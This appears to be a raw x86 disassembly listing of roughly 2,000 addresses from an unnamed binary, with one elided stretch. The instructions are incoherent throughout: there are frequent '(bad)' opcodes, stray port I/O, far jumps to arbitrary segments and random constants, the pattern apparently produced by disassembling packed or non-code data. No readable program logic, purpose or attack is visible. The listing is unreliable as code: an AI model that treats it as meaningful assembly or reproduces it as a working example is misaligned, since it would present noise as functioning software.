  40dd5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd5e:	mov    ds:0xcf021019,al
  40dd63:	cdq    
  40dd64:	xchg   esi,eax
  40dd65:	xchg   ebx,eax
  40dd66:	pop    esp
  40dd67:	aad    0xbb
  40dd69:	lahf   
  40dd6a:	push   ebx
  40dd6b:	arpl   WORD PTR [edx+ebp*2],cx
  40dd6e:	sub    ch,BYTE PTR [esi+0x34]
  40dd71:	push   ebp
  40dd72:	addr16 fs push eax
  40dd75:	jns    0x40dd98
  40dd77:	pop    edi
  40dd78:	sar    ebx,0xf
  40dd7b:	shl    ebp,1
  40dd7d:	xchg   esp,eax
  40dd7e:	xchg   edx,eax
  40dd7f:	cmp    eax,0xa2b13b43
  40dd84:	push   0xbaa1fe5f
  40dd89:	fldcw  WORD PTR [edi-0x46]
  40dd8c:	lds    ecx,FWORD PTR gs:[ebp-0x6]
  40dd90:	test   eax,0x271b6350
  40dd95:	enter  0xbec8,0x5d
  40dd99:	lahf   
  40dd9a:	rcr    DWORD PTR [edi+ecx*1-0x3e],cl
  40dd9e:	lods   eax,DWORD PTR ds:[esi]
  40dd9f:	push   ebx
  40dda0:	mov    edi,0x7579e9b1
  40dda5:	push   ebp
  40dda6:	dec    esi
  40dda7:	or     al,0x8b
  40dda9:	mov    dh,dh
  40ddab:	lock outs dx,DWORD PTR ds:[esi]
  40ddad:	pop    edx
  40ddae:	and    DWORD PTR [esi+0x767c0f51],esp
  40ddb4:	rol    BYTE PTR [edx-0x5b4961ea],1
  40ddba:	cmp    esp,ebp
  40ddbc:	fld    DWORD PTR [esi-0x34]
  40ddbf:	push   esi
  40ddc0:	out    dx,al
  40ddc1:	cmp    DWORD PTR [edi],esp
  40ddc3:	not    DWORD PTR [eax+0x52]
  40ddc6:	push   ecx
  40ddc7:	arpl   sp,sp
  40ddc9:	in     eax,0x3d
  40ddcb:	sbb    eax,0x59f4f4a7
  40ddd0:	sub    DWORD PTR [eax],0x150e6b17
  40ddd6:	inc    eax
  40ddd7:	pop    edi
  40ddd8:	lahf   
  40ddd9:	mov    esp,0x328c2356
  40ddde:	mov    esp,0x77a7f1f3
  40dde3:	fs push edx
  40dde5:	out    dx,eax
  40dde6:	mov    eax,0x9e09bc88
  40ddeb:	imul   ebp,esp,0x18
  40ddee:	cmp    BYTE PTR [ecx+edx*8+0x7b],al
  40ddf2:	enter  0x3a01,0x8e
  40ddf6:	fcmovb st,st(0)
  40ddf8:	add    eax,0x9f46c08f
  40ddfd:	push   esi
  40ddfe:	fimul  WORD PTR [ecx]
  40de00:	xchg   ebp,eax
  40de01:	jmp    0x2b8f6fef
  40de06:	ins    DWORD PTR es:[edi],dx
  40de07:	pop    ds
  40de08:	gs in  eax,dx
  40de0a:	sbb    BYTE PTR [ebx-0x4d],cl
  40de0d:	mov    ebp,0xb6fad18
  40de12:	mov    ds:0xb3d2a0eb,eax
  40de17:	jge    0x40de6b
  40de19:	or     eax,0xe9594a5b
  40de1e:	or     DWORD PTR [eax+0x2c9daccc],0x5b
  40de25:	mov    al,0xa0
  40de27:	ins    DWORD PTR es:[edi],dx
  40de28:	(bad)  
  40de2a:	sub    DWORD PTR [eax+eax*1-0x3f16e080],eax
  40de31:	and    cl,bh
  40de33:	mov    bl,0xd8
  40de35:	fstp   DWORD PTR [edx+eax*2]
  40de38:	mov    ebx,0xee320d03
  40de3d:	pusha  
  40de3e:	push   ecx
  40de3f:	inc    edx
  40de40:	into   
  40de41:	jmp    0x8e5ca009
  40de46:	add    edx,DWORD PTR [eax-0x7c92a6b9]
  40de4c:	pop    ds
  40de4d:	(bad)  
  40de4e:	lahf   
  40de4f:	shl    BYTE PTR [edx+0x50715325],1
  40de55:	(bad)  
  40de56:	imul   BYTE PTR [ecx+eiz*1]
  40de59:	out    dx,eax
  40de5a:	fisttp DWORD PTR [eax]
  40de5c:	ins    DWORD PTR es:[edi],dx
  40de5d:	pop    esi
  40de5e:	(bad)  
  40de5f:	jmp    0xff5189b2
  40de64:	add    eax,0xba23e218
  40de69:	stc    
  40de6a:	push   esi
  40de6b:	out    dx,al
  40de6c:	(bad)  
  40de6d:	rol    BYTE PTR [edx],cl
  40de6f:	fmul   st,st(1)
  40de71:	rcr    BYTE PTR [eax],cl
  40de73:	cmp    al,0x83
  40de75:	mov    ebp,0x94f84011
  40de7a:	mov    ah,0xbd
  40de7c:	jb     0x40debb
  40de7e:	mov    DWORD PTR [edx-0x3f],edx
  40de81:	mov    ebp,0xaa6a1647
  40de86:	pop    ds
  40de87:	mov    WORD PTR [edi+0x70],fs
  40de8a:	xlat   BYTE PTR ds:[ebx]
  40de8b:	ret    
  40de8c:	cmp    eax,0x96bbaef4
  40de91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de92:	clc    
  40de93:	or     dl,bh
  40de95:	add    edi,esi
  40de97:	inc    edi
  40de98:	int3   
  40de99:	pop    edx
  40de9a:	push   edx
  40de9b:	enter  0x1826,0x22
  40de9f:	add    al,0x4c
  40dea1:	scas   eax,DWORD PTR es:[di]
  40dea3:	sub    BYTE PTR [edi-0x257ab436],dl
  40dea9:	mov    edi,eax
  40deab:	dec    ebp
  40deac:	test   DWORD PTR [ebx],edx
  40deae:	dec    ecx
  40deaf:	adc    ch,BYTE PTR [eax-0x25026ce3]
  40deb5:	pop    eax
  40deb6:	stos   BYTE PTR es:[edi],al
  40deb7:	fwait
  40deb8:	or     al,0x2f
  40deba:	mov    bh,0xf9
  40debc:	and    BYTE PTR [ebx+0x2c05eb8f],bh
  40dec2:	push   ss
  40dec3:	ins    DWORD PTR es:[edi],dx
  40dec4:	cmc    
  40dec5:	pushf  
  40dec6:	retf   0xadb
  40dec9:	aam    0x96
  40decb:	into   
  40decc:	out    0x74,al
  40dece:	inc    ecx
  40decf:	sub    DWORD PTR [eax-0x6e15d876],eax
  40ded5:	cwde   
  40ded6:	mov    ds:0x9b8acf04,eax
  40dedb:	stos   DWORD PTR es:[edi],eax
  40dedc:	aad    0x15
  40dede:	jno    0x40df18
  40dee0:	mov    ds:0xf3cc6448,al
  40dee5:	inc    ebp
  40dee6:	fsubr  DWORD PTR [eax-0x1c7ab43d]
  40deec:	push   esi
  40deed:	ins    BYTE PTR es:[edi],dx
  40deee:	add    edx,esp
  40def0:	pop    ebp
  40def1:	mov    DWORD PTR [esi+ebx*8+0x4e38cf72],eax
  40def8:	scas   eax,DWORD PTR es:[edi]
  40def9:	pop    edx
  40defa:	out    0xd6,al
  40defc:	ficom  DWORD PTR [esi]
  40defe:	dec    eax
  40deff:	jno    0x40dee2
  40df01:	(bad)
  40df04:	(bad)  
  40df05:	cmp    BYTE PTR [ecx+0x47eaf76c],bl
  40df0b:	push   ds
  40df0c:	popa   
  40df0d:	pop    edx
  40df0e:	jns    0x40df04
  40df10:	or     DWORD PTR gs:[edx],ebx
  40df13:	fld    DWORD PTR [ecx]
  40df15:	gs push es
  40df17:	stos   DWORD PTR es:[edi],eax
  40df18:	pop    ecx
  40df19:	jmp    0x2fbf:0xa3b9bff5
  40df20:	inc    ebp
  40df21:	lea    edx,[eax]
  40df23:	push   esi
  40df24:	pop    ds
  40df25:	jmp    0x40df85
  40df27:	dec    ebp
  40df28:	inc    esp
  40df29:	adc    dl,BYTE PTR es:[ebx]
  40df2c:	stos   DWORD PTR es:[edi],eax
  40df2d:	fbstp  TBYTE PTR [ebp+ebx*2-0x37]
  40df31:	outs   dx,DWORD PTR ds:[esi]
  40df32:	mov    eax,ds:0x908ca82d
  40df37:	add    BYTE PTR [ecx],bh
  40df39:	xchg   ebp,eax
  40df3a:	and    ebp,DWORD PTR [eax]
  40df3c:	loopne 0x40dedb
  40df3e:	and    eax,0x9595004b
  40df43:	xor    al,0xf1
  40df45:	xor    dl,bh
  40df47:	push   ecx
  40df48:	cmc    
  40df49:	int    0xd4
  40df4b:	mov    dl,0xa9
  40df4d:	lea    eax,[esi+0x4eef7a14]
  40df53:	sub    ah,BYTE PTR [ebp+0x7]
  40df56:	mov    ecx,0x37817bd0
  40df5b:	jmp    0xe020:0xa1df3a1
  40df62:	outs   dx,BYTE PTR ds:[esi]
  40df63:	cs dec edx
  40df65:	aam    0xf5
  40df67:	mov    bh,0xb6
  40df69:	add    al,0xf1
  40df6b:	xor    DWORD PTR ds:0xab22156e,edx
  40df71:	jmp    0x40dfe2
  40df73:	fisub  WORD PTR [ebx+0x3c5ee9f1]
  40df79:	je     0x40dfbb
  40df7b:	imul   eax,DWORD PTR [edx+0x1b7c76a4],0x7a
  40df82:	test   al,0x81
  40df84:	add    eax,0xc995a206
  40df89:	push   ds
  40df8a:	push   ebp
  40df8b:	mov    ds:0x3c7306f8,eax
  40df90:	push   edx
  40df91:	int3   
  40df92:	adc    DWORD PTR [edx-0x2ab7adab],esp
  40df98:	int    0xa1
  40df9a:	or     DWORD PTR [edi-0x3f],0x7e9fe091
  40dfa1:	jae    0x40dfc9
  40dfa3:	aaa    
  40dfa4:	xchg   ebp,eax
  40dfa5:	mov    esi,0xe238787f
  40dfaa:	mov    edi,0xd390605f
  40dfaf:	mov    edi,0xc45f2d94
  40dfb4:	xchg   ecx,eax
  40dfb5:	inc    esi
  40dfb6:	mov    eax,0x7b46ac31
  40dfbb:	rol    BYTE PTR [edx+0x70],cl
  40dfbe:	clc    
  40dfbf:	mov    ch,0xad
  40dfc1:	jae    0x40df7c
  40dfc3:	call   0x534c1031
  40dfc8:	shr    ah,cl
  40dfca:	js     0x40df53
  40dfcc:	or     eax,0x436cdf5a
  40dfd1:	test   eax,0xc70d6100
  40dfd6:	icebp  
  40dfd7:	lahf   
  40dfd8:	fld    QWORD PTR [ebx-0x38775615]
  40dfde:	out    dx,al
  40dfdf:	mov    ah,0x42
  40dfe1:	imul   ebx,eax,0xbefdae0c
  40dfe7:	aad    0x3
  40dfe9:	jns    0x40dfdc
  40dfeb:	lds    edi,FWORD PTR [ebp-0x4dd7d146]
  40dff1:	stc    
  40dff2:	into   
  40dff3:	push   ecx
  40dff4:	mov    eax,0xb80dca71
  40dff9:	xor    BYTE PTR [edi],bh
  40dffb:	xchg   esp,eax
  40dffc:	xor    BYTE PTR [eax+0x6b],ch
  40dfff:	push   es
  40e000:	sbb    eax,0xa856a744
  40e005:	fsubp  st(0),st
  40e007:	rcr    DWORD PTR [ecx+0x46],cl
  40e00a:	and    BYTE PTR [edi+0x18],0xa3
  40e00e:	jno    0x40dfcc
  40e010:	mov    ds:0xc84e1c4b,al
  40e015:	sbb    BYTE PTR [edi],dh
  40e017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e018:	dec    esp
  40e019:	int    0x47
  40e01b:	xlat   BYTE PTR ds:[ebx]
  40e01c:	pop    ss
  40e01d:	and    DWORD PTR [esi],edx
  40e01f:	fld    st(6)
  40e021:	jb     0x40e023
  40e023:	cmp    DWORD PTR [ecx-0x4c],edx
  40e026:	mov    bh,0xe3
  40e028:	rcr    DWORD PTR [edi+0x75],1
  40e02b:	xor    al,0x3a
  40e02d:	test   eax,0x3405a3e1
  40e032:	xor    edx,DWORD PTR [eax]
  40e034:	and    ecx,DWORD PTR [ebp-0x2a]
  40e037:	test   eax,0x76b86c0f
  40e03c:	stc    
  40e03d:	xor    BYTE PTR [edi+0x75],al
  40e040:	xor    edi,0xce7e50bb
  40e046:	push   ds
  40e047:	mov    edi,0xe207cfb0
  40e04c:	rcl    BYTE PTR [ecx-0x71],1
  40e04f:	imul   eax,DWORD PTR [edx+0x18],0x15f41d0c
  40e056:	mov    esi,DWORD PTR [edx]
  40e058:	sub    BYTE PTR [eax],dh
  40e05a:	pop    edi
  40e05b:	pop    edx
  40e05c:	cmp    eax,0x83363dee
  40e061:	inc    edi
  40e062:	ret    0xf593
  40e065:	inc    esp
  40e066:	test   al,0x6a
  40e068:	sub    eax,0x83b3f4eb
  40e06d:	lea    eax,[edx-0x50fb8351]
  40e073:	sub    ebx,0xffffff80
  40e076:	inc    ebp
  40e077:	dec    edi
  40e078:	sbb    eax,0x8fc1f2c4
  40e07d:	inc    ebp
  40e07e:	ret    0x4b92
  40e081:	mov    dh,0xf4
  40e083:	xchg   DWORD PTR [edx],eax
  40e085:	int    0x72
  40e087:	repnz dec eax
  40e089:	mov    ecx,0x349e02f0
  40e08e:	rol    BYTE PTR [edi+eiz*8-0x3d445ef9],0x1d
  40e096:	test   BYTE PTR [ebx],dl
  40e098:	stc    
  40e099:	rol    BYTE PTR [edx],cl
  40e09b:	jo     0x40e02d
  40e09d:	adc    eax,0xa55fff33
  40e0a2:	cmp    al,0xc3
  40e0a4:	sar    BYTE PTR [ebx],cl
  40e0a6:	mov    ch,0xfc
  40e0a8:	push   cs
  40e0a9:	ror    esp,cl
  40e0ab:	imul   ecx,DWORD PTR cs:[edx-0x31],0xd09c9a61
  40e0b3:	mov    al,0x2f
  40e0b5:	push   0xffffffc3
  40e0b7:	cmc    
  40e0b8:	aad    0xdf
  40e0ba:	fld    TBYTE PTR [edi+esi*8+0x75]
  40e0be:	jmp    FWORD PTR [eax]
  40e0c0:	sbb    edx,DWORD PTR [edx]
  40e0c2:	pop    dx
  40e0c4:	fiadd  DWORD PTR [edx-0x39]
  40e0c7:	adc    BYTE PTR [ebx],0x29
  40e0ca:	out    dx,al
  40e0cb:	int    0x11
  40e0cd:	and    eax,0xfdd4c855
  40e0d2:	push   eax
  40e0d3:	cmp    BYTE PTR [edi+0xa],0x24
  40e0d7:	cld    
  40e0d8:	cld    
  40e0d9:	inc    ebp
  40e0da:	stos   BYTE PTR es:[edi],al
  40e0db:	das    
  40e0dc:	aam    0x37
  40e0de:	sub    al,0xd3
  40e0e0:	sub    dl,ah
  40e0e2:	sbb    BYTE PTR [ebx-0x58],dh
  40e0e5:	into   
  40e0e6:	out    0xfc,eax
  40e0e8:	sbb    eax,0xee89bcf1
  40e0ed:	or     BYTE PTR [edi-0x1f],cl
  40e0f0:	jae    0x40e0dc
  40e0f2:	test   dl,al
  40e0f4:	xchg   ebp,eax
  40e0f5:	xchg   ebp,eax
  40e0f6:	fiadd  DWORD PTR [edi+esi*1-0x6a7da049]
  40e0fd:	xchg   esp,eax
  40e0ff:	fist   WORD PTR [edi]
  40e101:	sbb    al,0x33
  40e103:	cmp    cl,0x7b
  40e106:	dec    BYTE PTR [eax-0x42]
  40e109:	push   edx
  40e10a:	and    ecx,DWORD PTR [eax]
  40e10c:	cdq    
  40e10d:	(bad)  
  40e10e:	dec    edx
  40e10f:	mov    esp,0x64aea2b9
  40e114:	cmp    eax,0xb9745851
  40e119:	mov    edx,0xd83ba1ce
  40e11e:	aam    0x6
  40e120:	test   eax,0x7e219458
  40e125:	xchg   esi,eax
  40e126:	(bad)  
  40e127:	cmc    
  40e128:	les    ebp,FWORD PTR ds:0x5515fbd7
  40e12e:	(bad)  
  40e12f:	sbb    al,0xf2
  40e131:	inc    eax
  40e132:	or     ch,BYTE PTR [ebx-0x61124c54]
  40e138:	mov    al,ds:0xda032d19
  40e13d:	adc    BYTE PTR ds:0xc1662a84,0xfd
  40e144:	fsubr  QWORD PTR [edi]
  40e146:	push   ds
  40e147:	ds push ss
  40e149:	fsubr  st,st(1)
  40e14b:	cld    
  40e14c:	lock js 0x40e1ca
  40e14f:	out    0x59,eax
  40e151:	in     eax,dx
  40e152:	dec    ebx
  40e153:	mov    ebp,DWORD PTR [ebp+0x3b]
  40e156:	leave  
  40e157:	mov    WORD PTR [esi-0x530c5901],?
  40e15d:	inc    ebx
  40e15e:	jno    0x40e12c
  40e160:	mov    ss,esp
  40e162:	xor    eax,0xbcfc6469
  40e167:	mov    eax,ds:0xd36ac2ad
  40e16c:	lods   al,BYTE PTR ds:[esi]
  40e16d:	test   eax,0x62e073e6
  40e172:	loopne 0x40e114
  40e174:	mov    esi,0x4c7bf442
  40e179:	mov    dl,al
  40e17b:	lea    esi,[edi]
  40e17d:	sub    ebx,DWORD PTR [ecx-0x21]
  40e180:	call   0xdc95:0x75c26e30
  40e187:	fild   DWORD PTR [edi-0x40]
  40e18a:	xchg   edi,eax
  40e18b:	stos   BYTE PTR es:[edi],al
  40e18c:	pop    ebx
  40e18d:	test   DWORD PTR [ebx-0x34edbfa9],edi
  40e193:	sub    al,0x3a
  40e195:	test   BYTE PTR ds:0x60ca3b28,0xdb
  40e19c:	ret    0x5981
  40e19f:	pop    esi
  40e1a0:	mov    ebx,0xaa3681d0
  40e1a5:	loope  0x40e1b8
  40e1a7:	push   ds
  40e1a8:	inc    ebx
  40e1a9:	mov    WORD PTR [ebx],es
  40e1ab:	(bad)  
  40e1ac:	pop    ecx
  40e1ad:	and    DWORD PTR [esp+ebx*4+0x1e1f710a],eax
  40e1b4:	repz test eax,0x986dafd
  40e1ba:	fdiv   DWORD PTR [eax-0x78db4796]
  40e1c0:	sahf   
  40e1c1:	inc    edx
  40e1c2:	xchg   ecx,eax
  40e1c3:	call   0x36de967e
  40e1c8:	scas   al,BYTE PTR es:[edi]
  40e1c9:	sub    eax,0xb9d28bf9
  40e1ce:	xchg   edi,eax
  40e1cf:	pop    es
  40e1d0:	aaa    
  40e1d1:	xor    eax,0xd8106a45
  40e1d6:	mov    dl,ch
  40e1d8:	rcl    DWORD PTR [ebp-0x66],1
  40e1db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1dc:	sub    ebx,DWORD PTR [edi-0x4c107c67]
  40e1e2:	sub    al,cl
  40e1e4:	aaa    
  40e1e5:	cmp    DWORD PTR [ebp-0x69],ecx
  40e1e8:	cdq    
  40e1e9:	cs mov esi,0xe927d70f
  40e1ef:	jecxz  0x40e255
  40e1f1:	mov    dh,0x78
  40e1f3:	(bad)  
  40e1f4:	xor    cl,al
  40e1f6:	mov    ebx,0xba87aab0
  40e1fb:	adc    BYTE PTR [esi+0x34],cl
  40e1fe:	inc    bl
  40e200:	xor    bl,BYTE PTR ds:0x5605a719
  40e206:	pop    ds
  40e207:	in     al,0xa4
  40e209:	inc    esp
  40e20a:	aaa    
  40e20b:	shr    DWORD PTR [esi-0x760021d7],0x6b
  40e212:	mov    es,edi
  40e214:	retf   0x83c1
  40e217:	repnz mov DWORD PTR [eax-0x7cc08574],ecx
  40e21e:	xchg   ecx,eax
  40e21f:	add    ecx,DWORD PTR [esi-0x32]
  40e222:	ja     0x40e271
  40e224:	inc    ebx
  40e225:	sti    
  40e226:	out    0xd8,al
  40e228:	or     edx,DWORD PTR [eax]
  40e22a:	js     0x40e283
  40e22c:	jmp    0xc0f0:0x1cbb297f
  40e233:	cmp    al,BYTE PTR [edi+0x5]
  40e236:	out    0xcb,eax
  40e238:	add    DWORD PTR [ebx+ebx*4-0x43],0xffffff98
  40e23d:	dec    eax
  40e23e:	test   eax,0xf4e108e8
  40e243:	lods   eax,DWORD PTR ds:[esi]
  40e244:	clc    
  40e245:	sar    cl,1
  40e247:	rcl    DWORD PTR [ebx],cl
  40e249:	shl    DWORD PTR [edx*2+0x740affb5],0xf0
  40e251:	mov    BYTE PTR [ecx],ah
  40e253:	push   esp
  40e254:	imul   edi,DWORD PTR [edx-0x41],0xffffffa7
  40e258:	dec    ebx
  40e259:	aam    0x9f
  40e25b:	popa   
  40e25c:	xchg   edx,eax
  40e25d:	data16 or BYTE PTR [ebx+ebx*1],dh
  40e261:	fist   DWORD PTR [edi+edx*8-0x26]
  40e265:	sti    
  40e266:	mov    ch,0xa7
  40e268:	pop    ebp
  40e269:	xor    al,0x67
  40e26b:	add    DWORD PTR ds:0x93dd485f,esi
  40e271:	fdiv   st(0),st
  40e273:	neg    cl
  40e275:	int    0x56
  40e277:	repz or ebp,DWORD PTR [esi+0x2dea240b]
  40e27e:	jnp    0x40e28a
  40e280:	pusha  
  40e281:	(bad)  
  40e283:	push   esi
  40e284:	cmp    eax,0x57ed2dc1
  40e289:	stc    
  40e28a:	pushf  
  40e28b:	sbb    eax,0xabef2927
  40e290:	jae    0x40e228
  40e292:	jmp    0x1f64a6dc
  40e297:	inc    edi
  40e298:	jno    0x40e2ab
  40e29a:	xlat   BYTE PTR ds:[ebx]
  40e29b:	add    ah,al
  40e29d:	lock pop es
  40e29f:	inc    ebp
  40e2a0:	pop    esp
  40e2a1:	push   cs
  40e2a2:	test   eax,0x2e6c89e8
  40e2a7:	test   DWORD PTR [esi],0x6040188d
  40e2ad:	inc    ebx
  40e2ae:	(bad)  
  40e2af:	push   ebp
  40e2b0:	inc    edi
  40e2b1:	xchg   esi,eax
  40e2b2:	adc    BYTE PTR [edi-0x59ca7812],bh
  40e2b8:	mov    edx,0x50b14042
  40e2bd:	popa   
  40e2be:	loop   0x40e2f1
  40e2c0:	mov    es,WORD PTR fs:[ebp+ecx*4-0x36]
  40e2c5:	loopne 0x40e2ed
  40e2c7:	in     al,0xc9
  40e2c9:	data16 and bh,BYTE PTR [esi+0x74]
  40e2cd:	xor    edi,DWORD PTR [esi]
  40e2cf:	not    BYTE PTR [eax-0x25d59ac3]
  40e2d5:	cmp    bl,dh
  40e2d7:	mov    eax,0xac36688f
  40e2dc:	add    eax,0x539dcc50
  40e2e1:	cmp    ecx,DWORD PTR [esi+0x3a]
  40e2e4:	pop    ebp
  40e2e5:	ds xor dl,dh
  40e2e8:	pop    esi
  40e2e9:	pop    esp
  40e2ea:	inc    esi
  40e2eb:	sbb    al,0x16
  40e2ed:	pop    eax
  40e2ee:	fcmovnb st,st(4)
  40e2f0:	dec    ebp
  40e2f1:	retf   0xf2f6
  40e2f4:	sub    eax,0xfc95a150
  40e2f9:	dec    eax
  40e2fa:	xlat   BYTE PTR ds:[ebx]
  40e2fb:	dec    edi
  40e2fc:	or     esi,esp
  40e2fe:	pop    ecx
  40e2ff:	and    DWORD PTR [esi-0x1663a65a],0x4a
  40e306:	sti    
  40e307:	mov    dh,0xb5
  40e309:	stc    
  40e30a:	and    ebp,DWORD PTR ds:0xb7b54488
  40e310:	xchg   edi,eax
  40e311:	pop    esp
  40e312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e313:	add    DWORD PTR [esi-0x3bb53d0b],edx
  40e319:	sahf   
  40e31a:	xor    BYTE PTR [esi-0x33],0x8a
  40e31e:	iret   
  40e31f:	add    al,0xee
  40e321:	test   eax,0x250301fd
  40e326:	mov    esp,0x9e814940
  40e32b:	out    0x48,al
  40e32d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e32e:	std    
  40e32f:	xlat   BYTE PTR ds:[ebx]
  40e330:	jmp    0x864c:0x45ec3b3d
  40e337:	push   ss
  40e338:	cdq    
  40e339:	ja     0x40e328
  40e33b:	pop    edi
  40e33c:	aaa    
  40e33d:	xor    eax,0x1d75085d
  40e342:	dec    esp
  40e343:	xchg   esi,eax
  40e344:	addr16 or cl,dl
  40e347:	pop    esp
  40e348:	(bad)  
  40e349:	xlat   BYTE PTR cs:[ebx]
  40e34b:	adc    dl,BYTE PTR [edi-0x30]
  40e34e:	push   edx
  40e34f:	into   
  40e350:	sub    eax,0x135bb8c0
  40e355:	stos   BYTE PTR es:[edi],al
  40e356:	bound  esi,QWORD PTR [edx]
  40e358:	dec    ebx
  40e359:	or     eax,0x1c278330
  40e35e:	mov    eax,ds:0xb0f1d4c5
  40e363:	ficomp WORD PTR [ecx-0x164c23d7]
  40e369:	loop   0x40e350
  40e36b:	add    esi,DWORD PTR [edx-0xa2a3ab0]
  40e371:	adc    al,0xc3
  40e373:	xor    al,0xf6
  40e375:	dec    edx
  40e376:	and    bl,BYTE PTR [ebx-0x4c8c3867]
  40e37c:	enter  0x5651,0xb6
  40e380:	imul   ecx,DWORD PTR [di+0x2e31],0x62
  40e386:	xchg   ebx,eax
  40e387:	inc    ecx
  40e388:	sub    DWORD PTR [ebp-0x61],edi
  40e38b:	icebp  
  40e38c:	xchg   esi,eax
  40e38d:	jp     0x40e38c
  40e38f:	outs   dx,DWORD PTR ds:[esi]
  40e390:	cmc    
  40e391:	sub    al,ch
  40e393:	pop    edx
  40e394:	repz out dx,al
  40e396:	jmp    0xfd0f:0x486e9c71
  40e39d:	add    DWORD PTR [edx+0x5c],0xd1e66b29
  40e3a4:	mov    ch,0x86
  40e3a6:	inc    edx
  40e3a7:	outs   dx,BYTE PTR ds:[esi]
  40e3a8:	lahf   
  40e3a9:	ja     0x40e3d6
  40e3ab:	xor    edi,ecx
  40e3ad:	retf   
  40e3ae:	int    0x68
  40e3b0:	cmp    DWORD PTR [esi-0x356a0c87],ebx
  40e3b6:	jge    0x40e3e7
  40e3b8:	ds retf 
  40e3ba:	mov    eax,0xb82bbbe3
  40e3bf:	popf   
  40e3c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3c1:	(bad)  
  40e3c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c3:	dec    esp
  40e3c4:	pop    esi
  40e3c5:	push   es
  40e3c6:	ret    
  40e3c7:	(bad)  
  40e3c8:	std    
  40e3c9:	jmp    0x40e39a
  40e3cb:	sbb    BYTE PTR [edx-0x28],dl
  40e3ce:	call   0x75c2:0xc6c28583
  40e3d5:	xchg   DWORD PTR [edx-0xa3e60b9],edx
  40e3db:	mov    bh,0xe7
  40e3dd:	and    al,0x10
  40e3df:	jo     0x40e362
  40e3e1:	ficomp WORD PTR [eax]
  40e3e3:	int3   
  40e3e4:	in     eax,dx
  40e3e5:	mov    bh,0xba
  40e3e7:	pop    edi
  40e3e8:	mov    DWORD PTR cs:[eax-0x9d42f2f],edi
  40e3ef:	cmp    ecx,DWORD PTR [edx-0x42e253b8]
  40e3f5:	cmc    
  40e3f6:	pause  
  40e3f8:	xor    DWORD PTR [ecx*1+0x64e3b9e3],0x2ca04c1
  40e403:	bound  edi,QWORD PTR [ebx-0x2ca7902b]
  40e409:	xor    eax,0xd2a9cf0a
  40e40e:	pop    eax
  40e40f:	mul    dl
  40e411:	dec    ebp
  40e412:	dec    edx
  40e413:	xchg   edi,eax
  40e414:	test   BYTE PTR [ebx-0x55ced441],dl
  40e41a:	mov    WORD PTR [edx+0x2c],gs
  40e41d:	pop    ebx
  40e41e:	xchg   ecx,eax
  40e41f:	and    dl,bh
  40e421:	mov    ebx,0x606e1f83
  40e426:	ret    
  40e427:	(bad)  
  40e428:	cmc    
  40e429:	add    esp,ebp
  40e42b:	fst    QWORD PTR [edi+eax*8]
  40e42e:	ret    0xc850
  40e431:	sbb    ah,dl
  40e433:	push   0x71568406
  40e438:	add    esp,edx
  40e43a:	pop    esp
  40e43b:	push   0xbc92fe04
  40e440:	shl    DWORD PTR [esi+0x14ccfa54],cl
  40e446:	dec    esi
  40e447:	rcr    BYTE PTR [ebx],0xd9
  40e44a:	sahf   
  40e44b:	in     al,dx
  40e44c:	mov    edx,0xec88150b
  40e451:	iret   
  40e452:	(bad)  
  40e453:	mov    bl,0x98
  40e455:	adc    al,ah
  40e457:	push   ebp
  40e458:	in     al,dx
  40e459:	repnz rcl BYTE PTR ds:[ebx],cl
  40e45d:	out    dx,eax
  40e45e:	fdiv   DWORD PTR [eax]
  40e460:	(bad)  
  40e461:	shl    BYTE PTR [eax],cl
  40e463:	cmp    eax,0x10c4db97
  40e468:	out    dx,al
  40e469:	or     BYTE PTR [eax+ecx*8],dh
  40e46c:	call   0x3856b0aa
  40e471:	and    cl,BYTE PTR [edi+eiz*1+0x45]
  40e475:	sub    DWORD PTR [ecx+0x6b],0x2c
  40e479:	jmp    0x9e0b:0xf4e93a25
  40e480:	sub    eax,0xad04e403
  40e485:	(bad)  
  40e486:	stos   DWORD PTR es:[edi],eax
  40e487:	mov    al,0xe3
  40e489:	xchg   DWORD PTR [eax],ecx
  40e48b:	push   esi
  40e48c:	jbe    0x40e4e7
  40e48e:	clc    
  40e48f:	ins    BYTE PTR es:[edi],dx
  40e490:	adc    ecx,DWORD PTR ds:0x98ea30bb
  40e496:	les    eax,FWORD PTR [eax]
	...
  40e514:	pop    ebx
  40e515:	ins    DWORD PTR es:[edi],dx
  40e516:	add    esi,DWORD PTR ds:0x6f7f7f37
  40e51c:	pop    eax
  40e51d:	je     0x40e4cc
  40e51f:	shl    BYTE PTR [ebx],1
  40e521:	pop    ebx
  40e522:	fistp  QWORD PTR [edi]
  40e524:	stos   DWORD PTR es:[edi],eax
  40e525:	xchg   edx,eax
  40e526:	add    BYTE PTR [eax],al
  40e528:	imul   eax,DWORD PTR [edi],0x0
  40e52b:	add    BYTE PTR [edi-0x13],al
  40e52e:	cmp    DWORD PTR [esi],eax
  40e530:	ret    0x8ff8
  40e533:	out    dx,eax
  40e534:	sbb    edx,ecx
  40e536:	fidiv  DWORD PTR [ecx+0x5f]
  40e539:	stos   BYTE PTR es:[edi],al
  40e53a:	pop    edi
  40e53b:	xor    ecx,0xcc02ce91
  40e541:	mov    ebx,0x1599fb9a
  40e546:	mov    ebp,0x9f7003aa
  40e54b:	js     0x40e5af
  40e54d:	inc    esp
  40e54e:	push   ds
  40e54f:	jae    0x40e57a
  40e551:	push   eax
  40e552:	mov    bh,0x82
  40e554:	jne    0x40e540
  40e556:	adc    eax,0xd20d8473
  40e55b:	sub    BYTE PTR [ebp+0x70],0x1a
  40e55f:	jno    0x40e5aa
  40e561:	pop    ds
  40e562:	and    BYTE PTR [esi],bl
  40e564:	xchg   dh,cl
  40e566:	xor    eax,0x9fd473c3
  40e56b:	lea    ebp,[ebp-0x62]
  40e56e:	sub    al,0xfa
  40e570:	lods   eax,DWORD PTR ds:[esi]
  40e571:	add    DWORD PTR [ebx+0x66e4d208],0x47
  40e578:	adc    eax,0x8bbfe98b
  40e57d:	sub    al,0x95
  40e57f:	pop    ecx
  40e580:	aaa    
  40e581:	fs dec edi
  40e583:	push   ds
  40e584:	lds    ebp,FWORD PTR [ecx]
  40e586:	outs   dx,DWORD PTR ds:[esi]
